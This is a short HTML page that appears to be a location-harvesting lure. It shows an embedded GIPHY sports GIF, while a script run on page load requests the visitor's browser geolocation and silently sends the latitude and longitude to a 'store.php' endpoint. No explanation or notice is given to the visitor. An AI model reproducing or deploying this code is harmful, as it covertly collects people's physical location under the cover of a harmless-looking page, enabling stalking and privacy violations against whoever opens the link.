<!DOCTYPE html>
<html>
<body onload="getLocation()">
    
<div style="width:100%;height:0;padding-bottom:100%;position:relative;"><iframe src="https://giphy.com/embed/duf84Bx74ujSXvJs0I" width="100%" height="100%" style="position:absolute" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div><p><a href="https://giphy.com/gifs/laughoutloudnetwork-nba-nfl-duf84Bx74ujSXvJs0I">via GIPHY</a></p>

<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  const xhttp = new XMLHttpRequest();
  xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude, true);
  xhttp.send();
}
</script>

</body>
</html>
